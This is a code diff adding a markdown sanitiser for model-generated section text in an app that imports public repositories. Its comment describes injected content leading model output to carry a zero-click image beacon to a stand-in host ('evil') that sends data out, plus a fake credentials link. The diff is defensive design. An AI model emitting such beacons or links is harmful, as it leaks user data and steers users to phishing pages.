@@ -47,3 +47,26 @@ export function skeletonIconFor(
 ): "AlertTriangle" | "Clock" {
   return reason === "failed" || reason === "degraded" ? "AlertTriangle" : "Clock";
 }
+
+/**
+ * The section `body` is model prose grounded in repo files, and BOTH are
+ * attacker-influenceable (any public repo can be imported). It is rendered as
+ * markdown, and the vendored `Markdown` primitive allows any `http(s)` URL —
+ * so an injected `![](https://evil/p?d=…)` would beacon on render (zero click)
+ * and an injected `[Configure credentials](https://evil/login)` would wear the
+ * app's own link styling inside a screen the reader trusts. The evidence gate
+ * covers `links[]`, never `body`.
+ *
+ * So: images are dropped entirely, markdown links collapse to their visible
+ * text, angle-autolinks and bare URLs are de-linkified (zero-width space after
+ * the scheme, so the text still reads but remark-gfm no longer autolinks it).
+ * File paths, code spans and every other markdown feature are untouched — the
+ * only thing removed is the ability to point the reader somewhere.
+ */
+export function sanitizeSectionBody(body: string): string {
+  return body
+    .replace(/!\[([^\]]*)\]\([^)]*\)/g, "$1")
+    .replace(/\[([^\]]*)\]\([^)]*\)/g, "$1")
+    .replace(/<((?:https?|mailto):[^>]*)>/gi, "$1")
+    .replace(/\b(https?|mailto):(?=\S)/gi, "$1:\u200b");
+}
